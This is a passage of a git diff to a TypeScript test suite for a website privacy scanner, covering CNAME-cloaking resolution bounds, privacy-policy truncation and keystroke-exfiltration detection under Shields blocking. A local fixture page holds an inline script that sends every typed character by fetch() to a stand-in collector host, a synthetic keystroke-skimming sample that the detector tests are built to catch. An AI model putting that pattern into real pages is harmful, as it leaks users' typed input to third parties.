@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
 import { createHash, generateKeyPairSync, sign } from "node:crypto";
+import { promises as dnsPromises } from "node:dns";
 import { readFile } from "node:fs/promises";
 import path from "node:path";
 import { createServer } from "node:http";
@@ -7,6 +8,7 @@ import { createSecureServer } from "node:http2";
 import { connect, createServer as createNetServer, type Socket } from "node:net";
 import { getCACertificates, setDefaultCACertificates } from "node:tls";
 import { test } from "node:test";
+import { pathToFileURL } from "node:url";
 import type { Frame, Page } from "playwright";
 import {
   PAGE_SUBJECT_CAPTURE_LOSS_DETAIL,
@@ -14,7 +16,7 @@ import {
   SUSPECTED_CHALLENGE_OR_SOFT_BLOCK_WARNING
 } from "./bot-wall-classifier";
 import { RedactionPass, redactScanResultV1, redactScannerWarnings } from "./redact-scan-report-v1";
-import { createConsentComparisonReport } from "./compare-reports";
+import { createConsentComparisonReport, createShieldsComparisonReport } from "./compare-reports";
 import { legacyComparisonDecision } from "./comparison-decision";
 import { comparisonEligibility, runHitKeystrokeProbeRequestsOmitted } from "./comparison-eligibility";
 import { consentInteractionWarning, findAndClickConsentControl } from "./consent-interaction";
@@ -38,6 +40,7 @@ import {
   browserProcessEnvironment,
   captureProbeRequest,
   classifyNavigationFailure,
+  CNAME_MAX_HOPS,
   completedKeystrokeProbeOutcome,
   closeSharedBrowserForTests,
   createContextOptions,
@@ -81,6 +84,7 @@ import {
   probeKeystrokeExfiltration,
   proxyEndpointKey,
   proxyRecordIncomplete,
+  resolveCnameChainViaDns,
   sameScanSubjectUrl,
   typeSentinelIntoFields,
   type KeystrokeProbeLifecycle,
@@ -127,6 +131,10 @@ import {
   viewFromV2
 } from "./scan-report-views";
 import { makeScanReportV1 } from "./scan-report-v2-fixtures";
+
+// The compiled tests are CommonJS, whose import() becomes require(); the
+// reviewer's CNAME reference is an ES module loaded as one.
+const nativeImport = new Function("specifier", "return import(specifier)") as (specifier: string) => Promise<unknown>;
 
 test("scannerEgressLabel canonicalizes unreviewed operator text before r2 collection", () => {
   assert.equal(scannerEgressLabel({}), "this scanner instance");
@@ -1914,12 +1922,12 @@ test("HTTP-200 robot pages and unavailable subject collectors fail quality and s
       reason: "load-failed"
     });
     assert.deepEqual(measurement.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "skipped",
       reason: "load-failed"
     });
     assert.deepEqual(measurement.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "skipped",
       reason: "load-failed"
     });
@@ -1945,7 +1953,7 @@ test("HTTP-200 robot pages and unavailable subject collectors fail quality and s
     );
     assert.equal(zillow.result.summary.status, 403);
     assert.deepEqual(zillow.measurement.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "skipped",
       reason: "load-failed"
     });
@@ -1968,7 +1976,7 @@ test("HTTP-200 robot pages and unavailable subject collectors fail quality and s
       options
     );
     assert.deepEqual(policyCap.measurement.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "skipped",
       reason: "evidence-cap-reached"
     });
@@ -2037,12 +2045,12 @@ test("HTTP-200 robot pages and unavailable subject collectors fail quality and s
       reason: "load-failed"
     });
     assert.deepEqual(unavailable.measurement.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "skipped",
       reason: "load-failed"
     });
     assert.deepEqual(unavailable.measurement.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "skipped",
       reason: "load-failed"
     });
@@ -2175,12 +2183,12 @@ test("the recorded HTTP status is the frozen subject's document after a script r
       reason: "load-failed"
     });
     assert.deepEqual(blocked.measurement.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "skipped",
       reason: "load-failed"
     });
     assert.deepEqual(blocked.measurement.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "skipped",
       reason: "load-failed"
     });
@@ -2295,12 +2303,12 @@ test("scanSite stages live phase-aware readbacks while returning only v1", { tim
     assert.equal(Object.keys(staged.measurement.detectors).length, 6);
     assert.equal(staged.measurement.detectors["fingerprint-heuristics"].status, "complete");
     assert.deepEqual(staged.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "complete",
       phaseId: 1
     });
     assert.deepEqual(staged!.measurement.detectors["cname-uncloaking"], {
-      version: "dns-cname-chain@5",
+      version: "dns-cname-chain@6",
       status: "failed",
       reason: "scan-failed",
       phaseId: 0
@@ -2535,7 +2543,7 @@ test("keystroke candidate overflow records exact detector-output truncation", { 
     assert.deepEqual(
       measurement.measurement.detectors["keystroke-exfiltration"],
       {
-        version: "synthetic-sentinel@5",
+        version: "synthetic-sentinel@6",
         status: "partial",
         reason: "evidence-cap-reached",
         phaseId: activePhase.phaseId
@@ -2618,7 +2626,7 @@ test("CNAME candidate overflow records detector-output loss instead of a complet
     assert.equal(result.warnings.includes(CNAME_CANDIDATES_OMITTED_WARNING), true);
     assert.equal(result.warnings.includes(CNAME_LOOKUP_FAILED_WARNING), false, "no lookup failed");
     assert.deepEqual(measurement.measurement.detectors["cname-uncloaking"], {
-      version: "dns-cname-chain@5",
+      version: "dns-cname-chain@6",
       status: "partial",
       reason: "evidence-cap-reached",
       phaseId: 0
@@ -2689,7 +2697,7 @@ test("CNAME resolution does not let a filter-list match override a reviewed nont
       false
     );
     assert.deepEqual(measurement.measurement.detectors["cname-uncloaking"], {
-      version: "dns-cname-chain@5",
+      version: "dns-cname-chain@6",
       status: "complete",
       phaseId: 0
     });
@@ -2790,6 +2798,251 @@ test("a CNAME lookup that fails beside a found cloak publishes a partial detecto
     else process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = previousConsentVerification;
     await closeSharedBrowserForTests();
     await new Promise<void>((resolve) => upstream.close(() => resolve()));
+  }
+});
+
+/**
+ * Answer node:dns's resolveCname from `aliases`, each name's one CNAME, with
+ * ENODATA for every other name, while `run` runs, recording each name looked
+ * up. The scanner's own resolver then runs and no lookup leaves this machine.
+ */
+async function withCnameAliases<T>(
+  aliases: Readonly<Record<string, string>>,
+  run: (lookups: string[]) => Promise<T>
+): Promise<T> {
+  const resolver = dnsPromises as unknown as { resolveCname: (name: string) => Promise<string[]> };
+  const original = resolver.resolveCname;
+  const lookups: string[] = [];
+  resolver.resolveCname = async (name: string) => {
+    lookups.push(name);
+    const next = aliases[name.toLowerCase()];
+    if (next) return [next];
+    throw Object.assign(new Error(`queryCname ENODATA ${name}`), { code: "ENODATA" });
+  };
+  try {
+    return await run(lookups);
+  } finally {
+    resolver.resolveCname = original;
+  }
+}
+
+/** Aliases that chain `host` through `names` in order, the last with no CNAME. */
+function cnameAliasChain(host: string, names: readonly string[]): Record<string, string> {
+  const aliases: Record<string, string> = {};
+  let current = host;
+  for (const name of names) {
+    aliases[current] = name;
+    current = name;
+  }
+  return aliases;
+}
+
+/**
+ * Scan a page that loads one first-party subdomain, metrics.<site>, through
+ * the scanner's own CNAME resolver, with resolveCname answering from
+ * `aliases` (withCnameAliases).
+ */
+async function scanCnameChain(site: string, aliases: Readonly<Record<string, string>>) {
+  const upstream = createServer((request, response) => {
+    const host = request.headers.host?.split(":")[0] ?? "";
+    if (host === site) {
+      response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+      response.end(`<!doctype html><title>CNAME chain fixture</title><script src="http://metrics.${site}/m.js"></script>`);
+      return;
+    }
+    response.writeHead(200, { "content-type": "application/javascript" });
+    response.end("globalThis.loaded = true;");
+  });
+  await new Promise<void>((resolve, reject) => {
+    upstream.once("error", reject);
+    upstream.listen(0, "127.0.0.1", resolve);
+  });
+  const address = upstream.address();
+  assert.ok(address && typeof address === "object");
+  const previousConsentVerification = process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+  process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = "1";
+  try {
+    return await withCnameAliases(aliases, async (lookups) => {
+      const visit = await scanSiteWithMeasurement(
+        { url: `http://${site}/`, device: "desktop", gpcEnabled: false, consentMode: "observe" },
+        {
+          publicUrlAlreadyVerified: true,
+          verifyPublicUrl: async () => undefined,
+          resolvePublicHost: async () => [{ address: "93.184.216.34", family: 4 }],
+          connectProxyUpstreamForTests: () => connect(address.port, "127.0.0.1")
+        }
+      );
+      return {
+        visit,
+        lookups: [...lookups],
+        detector: visit.measurement.measurement.detectors["cname-uncloaking"],
+        losses: visit.measurement.measurement.qualityFacts.captureLoss.filter((loss) => loss.detail === "cname-lookups"),
+        cloaks: visit.measurement.evidence.cnameCloaks.map((cloak) => [cloak.host, cloak.cname, cloak.tracker.entity]),
+        failedLookupLine: visit.result.warnings.includes(CNAME_LOOKUP_FAILED_WARNING)
+      };
+    });
+  } finally {
+    if (previousConsentVerification === undefined) delete process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+    else process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = previousConsentVerification;
+    await closeSharedBrowserForTests();
+    await new Promise<void>((resolve) => upstream.close(() => resolve()));
+  }
+}
+
+const CNAME_LOOKUP_FAILED_LOSS = { family: "detector-output", phaseId: 0, kind: "dropped", count: 1, detail: "cname-lookups" };
+
+test("a CNAME chain whose tracker sits four names down yields the cloak", { timeout: 30_000 }, async () => {
+  // dns-cname-chain@5 stopped after three names and reported them as the
+  // whole chain, complete with no cloak.
+  const names = ["edge.alias-one.net", "edge.alias-two.net", "edge.alias-three.net", "cname-depth.sc.omtrdc.net"];
+  const scanned = await scanCnameChain("cname-depth.com", cnameAliasChain("metrics.cname-depth.com", names));
+  assert.deepEqual(scanned.cloaks, [["metrics.cname-depth.com", "cname-depth.sc.omtrdc.net", "Adobe"]]);
+  assert.deepEqual((scanned.visit.result.cnameCloaks ?? []).map((cloak) => cloak.tracker.entity), ["Adobe"]);
+  assert.deepEqual(scanned.detector, { version: DETECTOR_VERSIONS["cname-uncloaking"], status: "complete", phaseId: 0 });
+  assert.deepEqual(scanned.losses, []);
+  assert.equal(scanned.failedLookupLine, false);
+  assert.deepEqual(scanned.lookups, ["metrics.cname-depth.com", ...names]);
+});
+
+test("a CNAME chain past the hop bound records the failed-lookup loss, never a complete negative", { timeout: 30_000 }, async () => {
+  // Eleven aliases and no tracker in the ten the resolver follows: the name
+  // past them may be the tracker, so the lookup did not complete.
+  const names = Array.from({ length: 11 }, (_, index) => `hop${index + 1}.alias-host.net`);
+  const scanned = await scanCnameChain("cname-long.com", cnameAliasChain("metrics.cname-long.com", names));
+  assert.deepEqual(scanned.detector, {
+    version: DETECTOR_VERSIONS["cname-uncloaking"], status: "failed", reason: "scan-failed", phaseId: 0
+  });
+  assert.deepEqual(scanned.losses, [CNAME_LOOKUP_FAILED_LOSS]);
+  assert.equal(scanned.failedLookupLine, true);
+  assert.deepEqual(scanned.cloaks, []);
+  const { r2, v1, v1Report } = bothWireDisplayFacts(scanned.visit);
+  assert.equal(v1Report.warnings.includes(CNAME_LOOKUP_FAILED_WARNING), true, "the sanitizer admits the line");
+  assert.equal(r2.claims["cname-cloaking"].allowed, false);
+  assert.equal(v1.claims["cname-cloaking"].allowed, false);
+  assertV1WithholdsEachClaimR2Withholds(r2, v1);
+  assert.equal(scanned.lookups.length, CNAME_MAX_HOPS);
+  assert.deepEqual(scanned.lookups, ["metrics.cname-long.com", ...names.slice(0, CNAME_MAX_HOPS - 1)]);
+});
+
+test("a three-CNAME chain that ends in ENODATA stays complete", { timeout: 30_000 }, async () => {
+  // The resolver asks the third alias for its CNAME and hears that it has
+  // none, so the chain ended inside the bound.
+  const names = ["hop1.alias-host.net", "hop2.alias-host.net", "hop3.alias-host.net"];
+  const scanned = await scanCnameChain("cname-short.com", cnameAliasChain("metrics.cname-short.com", names));
+  assert.deepEqual(scanned.detector, { version: DETECTOR_VERSIONS["cname-uncloaking"], status: "complete", phaseId: 0 });
+  assert.deepEqual(scanned.losses, []);
+  assert.equal(scanned.failedLookupLine, false);
+  assert.deepEqual(scanned.cloaks, []);
+  assert.deepEqual(scanned.lookups, ["metrics.cname-short.com", ...names]);
+});
+
+test("a CNAME loop records the failed-lookup loss, never a complete negative", { timeout: 30_000 }, async () => {
+  // A chain that comes back to a name it passed never reaches one without a
+  // CNAME. dns-cname-chain@5 walked it three times round and reported it
+  // complete.
+  const scanned = await scanCnameChain("cname-loop.com", {
+    "metrics.cname-loop.com": "loop-a.alias-host.net",
+    "loop-a.alias-host.net": "loop-b.alias-host.net",
+    "loop-b.alias-host.net": "loop-a.alias-host.net"
+  });
+  assert.deepEqual(scanned.detector, {
+    version: DETECTOR_VERSIONS["cname-uncloaking"], status: "failed", reason: "scan-failed", phaseId: 0
+  });
+  assert.deepEqual(scanned.losses, [CNAME_LOOKUP_FAILED_LOSS]);
+  assert.equal(scanned.failedLookupLine, true);
+  assert.deepEqual(scanned.cloaks, []);
+  assert.deepEqual(scanned.lookups, ["metrics.cname-loop.com", "loop-a.alias-host.net", "loop-b.alias-host.net"]);
+});
+
+test("a tracker within the hop bound stands as a cloak though the chain goes on past it", { timeout: 30_000 }, async () => {
+  // The tracker is five names down, past dns-cname-chain@5's bound, and the
+  // chain continues past the ten names the resolver follows. What lies beyond
+  // cannot undo the alias it reached, so no loss is recorded.
+  const names = [
+    "edge.alias-one.net", "edge.alias-two.net", "edge.alias-three.net", "edge.alias-four.net",
+    "cname-past.sc.omtrdc.net",
+    ...Array.from({ length: 7 }, (_, index) => `hop${index + 1}.alias-host.net`)
+  ];
+  const scanned = await scanCnameChain("cname-past.com", cnameAliasChain("metrics.cname-past.com", names));
+  assert.deepEqual(scanned.cloaks, [["metrics.cname-past.com", "cname-past.sc.omtrdc.net", "Adobe"]]);
+  assert.deepEqual(scanned.detector, { version: DETECTOR_VERSIONS["cname-uncloaking"], status: "complete", phaseId: 0 });
+  assert.deepEqual(scanned.losses, []);
+  assert.equal(scanned.failedLookupLine, false);
+  assert.equal(scanned.lookups.length, CNAME_MAX_HOPS, "the chain is unfinished at the bound");
+});
+
+test("a CNAME chain the scan deadline cuts is a failed lookup, never an unfinished or a complete chain", async () => {
+  // The first lookup answers at once with a tracker; the next one's answer is
+  // held 5 s, past a deadline 1 s away, so its own timeout, clamped to the
+  // time left, cuts it. A chain cut there must reject, as a lookup that fails
+  // does, so the caller records the failed-lookup loss; returned as
+  // unfinished, its tracker would stand with no loss, and returned as a
+  // chain, it would read as complete.
+  const resolver = dnsPromises as unknown as { resolveCname: (name: string) => Promise<string[]> };
+  const original = resolver.resolveCname;
+  const lookups: string[] = [];
+  resolver.resolveCname = (name: string) => {
+    lookups.push(name);
+    if (name === "metrics.cname-cut.com") return Promise.resolve(["cname-cut.sc.omtrdc.net"]);
+    return new Promise<string[]>((resolve) => {
+      setTimeout(() => resolve(["hop1.alias-host.net"]), 5_000).unref();
+    });
+  };
+  try {
+    await assert.rejects(resolveCnameChainViaDns("metrics.cname-cut.com", Date.now() + 1_000), /dns-lookup-timeout/);
+    assert.deepEqual(lookups, ["metrics.cname-cut.com", "cname-cut.sc.omtrdc.net"]);
+    // A lookup the deadline has already passed is never started.
+    lookups.length = 0;
+    await assert.rejects(resolveCnameChainViaDns("metrics.cname-cut.com", Date.now() - 1), /cname-deadline-exceeded/);
+    assert.deepEqual(lookups, []);
+  } finally {
+    resolver.resolveCname = original;
+  }
+});
+
+test("the scanner's CNAME hop bound is the reviewer reference's", async () => {
+  // scripts/calibration-cname-reference-lib.mjs takes nothing from the
+  // scanner, so the two cannot share a constant. Drive both resolvers over the
+  // same endless chain and require the same bound and the same verdict.
+  const reference = (await nativeImport(
+    pathToFileURL(path.join(process.cwd(), "scripts", "calibration-cname-reference-lib.mjs")).href
+  )) as {
+    resolveCnameChain: (host: string, options: { resolverAddress: string }) => Promise<{
+      chain: string[];
+      terminated: boolean;
+      failureCode: string | null;
+    }>;
+  };
+  const endless = (name: string): string => {
+    const match = /^hop(\d+)\.pin-chain\.net$/.exec(name);
+    return `hop${match ? Number(match[1]) + 1 : 1}.pin-chain.net`;
+  };
+  const prototype = dnsPromises.Resolver.prototype as unknown as { resolveCname: (name: string) => Promise<string[]> };
+  const scanner = dnsPromises as unknown as { resolveCname: (name: string) => Promise<string[]> };
+  const originalPrototype = prototype.resolveCname;
+  const originalScanner = scanner.resolveCname;
+  let referenceLookups = 0;
+  let scannerLookups = 0;
+  prototype.resolveCname = async (name: string) => {
+    referenceLookups += 1;
+    return [endless(name)];
+  };
+  scanner.resolveCname = async (name: string) => {
+    scannerLookups += 1;
+    return [endless(name)];
+  };
+  try {
+    const referenceChain = await reference.resolveCnameChain("metrics.pin-chain.com", { resolverAddress: "127.0.0.1" });
+    const scannerChain = await resolveCnameChainViaDns("metrics.pin-chain.com", Date.now() + 30_000);
+    assert.equal(CNAME_MAX_HOPS, 10);
+    assert.equal(referenceLookups, CNAME_MAX_HOPS);
+    assert.equal(scannerLookups, CNAME_MAX_HOPS);
+    assert.deepEqual(scannerChain, { chain: referenceChain.chain, terminated: false });
+    assert.equal(referenceChain.terminated, false);
+    assert.equal(referenceChain.failureCode, "MAX_HOPS");
+  } finally {
+    prototype.resolveCname = originalPrototype;
+    scanner.resolveCname = originalScanner;
   }
 });
 
@@ -4072,7 +4325,7 @@ test("a direct PDF privacy policy completes through the bounded scan proxy", { t
     assert.ok(result.privacyPolicy, "the PDF policy produced a stored cross-check summary");
     assert.ok((result.privacyPolicy?.policyTextLength ?? 0) >= 500);
     assert.deepEqual(staged!.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "complete",
       phaseId: 2
     });
@@ -4139,8 +4392,8 @@ test("a PDF privacy policy link that redirects or is missing cannot crash the pr
 
   try {
     for (const [route, expected] of [
-      ["/", { version: "policy-text-cross-check@11", status: "complete", phaseId: 2 }],
-      ["/missing", { version: "policy-text-cross-check@11", status: "failed", reason: "load-failed", phaseId: 2 }]
+      ["/", { version: "policy-text-cross-check@12", status: "complete", phaseId: 2 }],
+      ["/missing", { version: "policy-text-cross-check@12", status: "failed", reason: "load-failed", phaseId: 2 }]
     ] as const) {
       const { measurement: staged } = await scanSiteWithMeasurement(
         { url: `http://policy-pdf-hop.test${route}`, device: "desktop", gpcEnabled: false, consentMode: "observe" },
@@ -4218,7 +4471,7 @@ test("an HTTPS PDF privacy policy is requested offering HTTP/1.1 alone", { timeo
     assert.ok(offers.length > 0, "the policy fetch never reached the TLS upstream");
     for (const protocols of offers) assert.deepEqual(protocols, ["http/1.1"]);
     assert.deepEqual(staged!.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "failed",
       reason: "load-failed",
       phaseId: 2
@@ -4291,7 +4544,7 @@ test("an HTTPS PDF privacy policy completes over HTTP/1.1 through the scan proxy
     );
 
     assert.deepEqual(staged!.measurement.detectors["privacy-policy"], {
-      version: "policy-text-cross-check@11",
+      version: "policy-text-cross-check@12",
       status: "complete",
       phaseId: 2
     });
@@ -5635,7 +5888,7 @@ test("a consent click cannot promote a sibling origin into evidence or active-in
       phaseId: 1
     });
     assert.deepEqual(staged!.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "skipped",
       reason: "load-failed"
     });
@@ -6080,7 +6333,7 @@ test("post-consent cross-site reload evidence is rejected and the active input p
     );
     const reloadPhase = staged!.measurement.phases.find((phase) => phase.kind === "post-choice-reload")!;
     assert.deepEqual(staged!.measurement.detectors["keystroke-exfiltration"], {
-      version: "synthetic-sentinel@5",
+      version: "synthetic-sentinel@6",
       status: "skipped",
       reason: "load-failed"
     });
@@ -6944,33 +7197,43 @@ test("a passive fingerprint observation survives a final read that lost a frame"
   );
 });
 
-test("a privacy policy that fills the character cap survives its own JSON escaping", () => {
+test("a privacy policy read counts only when the collector read it in full, even one that fills the character cap", () => {
   // The collector returns JSON.stringify({ value, truncated }), whose envelope
   // alone costs 29 characters. Bounding that wire at the character cap plus a
   // flat 128 left 99 characters for escape expansion, and a policy page long
   // enough to reach the cap carries thousands of newlines that each cost two
-  // wire characters. The complete 2xx read was thrown away and the detector
-  // ledger published the largest policies, exactly the ones the truncation
-  // path exists for, as load failures.
+  // wire characters. A complete 2xx read of exactly the cap was thrown away
+  // and published as a load failure, so it must still survive its escapes.
   const line = `${"a".repeat(126)}\n`;
   const capped = line.repeat(Math.ceil(MAX_POLICY_TEXT_CHARS / line.length)).slice(0, MAX_POLICY_TEXT_CHARS);
   assert.equal(capped.length, MAX_POLICY_TEXT_CHARS);
-
-  const wire = JSON.stringify({ value: capped, truncated: true });
+  const wire = JSON.stringify({ value: capped, truncated: false });
   assert.ok(wire.length > MAX_POLICY_TEXT_CHARS + 128, "the fixture must outgrow the flat wire allowance");
   assert.equal(boundedPolicyTextFromWire(wire), capped);
 
-  // An escape-free capped read was always accepted, so the widened allowance
-  // must not change the small-policy behavior the end-to-end fixture covers.
-  const plain = "b".repeat(MAX_POLICY_TEXT_CHARS);
-  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: plain, truncated: true })), plain);
+  // A read the collector cut short, at the character cap or at its node bound
+  // whatever its length, kept the cut text through policy-text-cross-check@11
+  // and published the companies named past the cut as ones the policy does
+  // not name. It is no policy text now, and neither is a wire that does not
+  // say it was read in full.
+  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: capped, truncated: true })), "");
+  assert.equal(
+    boundedPolicyTextFromWire(JSON.stringify({ value: "b".repeat(MAX_POLICY_TEXT_CHARS), truncated: true })),
+    ""
+  );
+  const nodeCut = "We collect the details you give us. ".repeat(2_500);
+  assert.ok(nodeCut.length < MAX_POLICY_TEXT_CHARS, "a node-bound cut can be any length");
+  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: nodeCut, truncated: true })), "");
+  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: nodeCut })), "");
+  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: nodeCut, truncated: "false" })), "");
+  assert.equal(boundedPolicyTextFromWire(JSON.stringify({ value: nodeCut, truncated: false })), nodeCut);
 });
 
 test("the widened policy wire allowance still enforces the character cap", () => {
   // Widening the wire bound must not become a way past the cap itself: the
   // value length is the check that binds, and a wire far too large to hold a
   // capped value is still refused before it is parsed.
-  const overCap = JSON.stringify({ value: "a".repeat(MAX_POLICY_TEXT_CHARS + 1), truncated: true });
+  const overCap = JSON.stringify({ value: "a".repeat(MAX_POLICY_TEXT_CHARS + 1), truncated: false });
   assert.ok(overCap.length < MAX_POLICY_TEXT_CHARS * 6 + 128, "the over-cap fixture must reach the parse");
   assert.equal(boundedPolicyTextFromWire(overCap), "");
 
@@ -7457,6 +7720,173 @@ test("a child-frame navigation the input probe aborts leaves the request log and
     await closeSharedBrowserForTests();
     await new Promise<void>(resolve => upstream.close(() => resolve()));
   }
+});
+
+/**
+ * Scan a page whose search field sends every keystroke to `collector` at a
+ * path the Brave lists block, and count what the collector received. Every
+ * connection goes to the local fixture through the scan proxy's test seam;
+ * `refusedHost` is a host the route guard's public-address check refuses, and
+ * `collectorCheckMs` holds that check for the collector's host that long, as
+ * a slow lookup would, before the route reaches the Shields engine.
+ */
+async function scanTypedValueSink(options: {
+  collector: string;
+  shieldsBlockingEnabled: boolean;
+  refusedHost?: string;
+  collectorCheckMs?: number;
+}) {
+  const received = { all: 0, sentinel: 0 };
+  const upstream = createServer((request, response) => {
+    const host = request.headers.host?.split(":")[0] ?? "";
+    if (host === options.collector) {
+      received.all += 1;
+      if (/sblcanary/i.test(request.url ?? "")) received.sentinel += 1;
+      response.writeHead(204, { "access-control-allow-origin": "*" });
+      response.end();
+      return;
+    }
+    if ((request.url ?? "").startsWith("/favicon")) {
+      response.writeHead(404);
+      response.end();
+      return;
+    }
+    response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+    response.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Input fixture</title></head><body>
+      <label>Search <input id="q" type="text" name="q"></label>
+      <script>
+        document.getElementById("q").addEventListener("input", (event) => {
+          fetch("http://${options.collector}/collect?v=1&q=" + encodeURIComponent(event.target.value), { mode: "no-cors" })
+            .catch(() => {});
+        });
+      </script></body></html>`);
+  });
+  await new Promise<void>((resolve, reject) => {
+    upstream.once("error", reject);
+    upstream.listen(0, "127.0.0.1", resolve);
+  });
+  const address = upstream.address();
+  assert.ok(address && typeof address === "object");
+  const previousConsentVerification = process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+  process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = "1";
+  try {
+    const visit = await scanSiteWithMeasurement(
+      { url: "http://input-sink-fixture.com/", device: "desktop", gpcEnabled: false, consentMode: "observe" },
+      {
+        publicUrlAlreadyVerified: true,
+        verifyPublicUrl: async (url) => {
+          if (url.hostname === options.refusedHost) throw new Error("synthetic non-public address");
+          if (url.hostname === options.collector && options.collectorCheckMs) {
+            await new Promise<void>((resolve) => setTimeout(resolve, options.collectorCheckMs));
+          }
+        },
+        resolvePublicHost: async () => [{ address: "93.184.216.34", family: 4 }],
+        connectProxyUpstreamForTests: () => connect(address.port, "127.0.0.1"),
+        resolveCnameChain: async () => [],
+        shieldsBlockingEnabled: options.shieldsBlockingEnabled
+      }
+    );
+    const r2 = toPublicScanReportR2(
+      buildRuntimeScanReportV2R2(visit, "public-api", { SITE_BEHAVIOR_LAB_BUILD_COMMIT: "a".repeat(40) } as NodeJS.ProcessEnv)
+    );
+    const v1Report = redactScanResultV1(visit.result).report;
+    const recipients = (detections: ReadonlyArray<{ readonly kind: string }> | undefined): string[] | null => {
+      const detection = detections?.find((entry) => entry.kind === "keystroke-exfiltration") as
+        | { readonly evidence: { readonly recipients: readonly string[] } }
+        | undefined;
+      return detection ? [...detection.evidence.recipients] : null;
+    };
+    return {
+      visit,
+      received,
+      r2Detector: r2.run.detectors["keystroke-exfiltration"],
+      recipients: {
+        v1: recipients(visit.result.fingerprintDetections),
+        v1Report: recipients(v1Report.fingerprintDetections),
+        staged: recipients(visit.measurement.evidence.fingerprintDetections),
+        r2: recipients(r2.run.evidence.fingerprintDetections)
+      }
+    };
+  } finally {
+    if (previousConsentVerification === undefined) delete process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+    else process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = previousConsentVerification;
+    await closeSharedBrowserForTests();
+    await new Promise<void>((resolve) => upstream.close(() => resolve()));
+  }
+}
+
+test("a typed value the Shields engine stops names no recipient on either wire, and the visit without blocking still names it", { timeout: 90_000 }, async () => {
+  // synthetic-sentinel@5 matched what the page's request event handed it,
+  // before the route decided, and never read which requests the Shields
+  // engine then aborted. The block simulation named a recipient that received
+  // nothing, so the comparison showed no change where blocking stopped the
+  // value.
+  const collector = "keystroke-collector.com";
+  const baseline = await scanTypedValueSink({ collector, shieldsBlockingEnabled: false });
+  const variant = await scanTypedValueSink({ collector, shieldsBlockingEnabled: true });
+
+  // The lists match the collector's URL: the visit without blocking marks every
+  // row to it, and the collector received the typed value.
+  const baselineRows = baseline.visit.result.requests.filter((request) => request.domain === collector);
+  assert.ok(baselineRows.length > 0);
+  assert.equal(baselineRows.every((request) => request.blockedByShields === true), true);
+  assert.ok(baseline.received.sentinel > 0, "without blocking the typed value reached the collector");
+  for (const wire of ["v1", "v1Report", "staged", "r2"] as const) {
+    assert.deepEqual(baseline.recipients[wire], [collector], `without blocking, ${wire} names the collector`);
+  }
+  assert.equal(baseline.r2Detector.status, "complete");
+
+  // With blocking, the engine stopped every request: the collector received
+  // none, no wire names it, and the probe finished.
+  assert.deepEqual(variant.received, { all: 0, sentinel: 0 });
+  assert.deepEqual(variant.visit.result.requests.filter((request) => request.domain === collector), []);
+  for (const wire of ["v1", "v1Report", "staged", "r2"] as const) {
+    assert.equal(variant.recipients[wire], null, `with blocking, ${wire} carries no input detection`);
+  }
+  assert.equal(variant.r2Detector.status, "complete");
+  assert.deepEqual(
+    variant.visit.measurement.measurement.detectors["keystroke-exfiltration"],
+    { version: DETECTOR_VERSIONS["keystroke-exfiltration"], status: "complete", phaseId: 1 }
+  );
+
+  // The comparison shows the change blocking made.
+  const comparison = createShieldsComparisonReport(baseline.visit.result, variant.visit.result, { executedFirst: "baseline" });
+  assert.equal(
+    comparison.diff.removedFingerprinting.some((change) => change.kind === "keystroke-exfiltration"),
+    true
+  );
+});
+
+test("a typed value the Shields engine stops after a slow host check names no recipient", { timeout: 90_000 }, async () => {
+  // The route reaches the Shields engine only after the guard's public-host
+  // check, which here outlasts the probe's wait after typing. The probe must
+  // wait for the route's decisions before it matches, or it names a recipient
+  // whose every request was then aborted.
+  const collector = "slow-check-collector.com";
+  const variant = await scanTypedValueSink({ collector, shieldsBlockingEnabled: true, collectorCheckMs: 8_000 });
+  assert.deepEqual(variant.received, { all: 0, sentinel: 0 });
+  for (const wire of ["v1", "v1Report", "staged", "r2"] as const) {
+    assert.equal(variant.recipients[wire], null, `${wire} carries no input detection`);
+  }
+  assert.equal(variant.r2Detector.status, "complete");
+});
+
+test("a typed value the route guard refuses still names its recipient, never a complete finding that it stayed", { timeout: 60_000 }, async () => {
+  // The guard runs before the Shields engine, so this request, which the lists
+  // also match, is the scanner's own abort. No loss leaves the input claim
+  // incomplete for it, so dropping it as the Shields aborts are dropped would
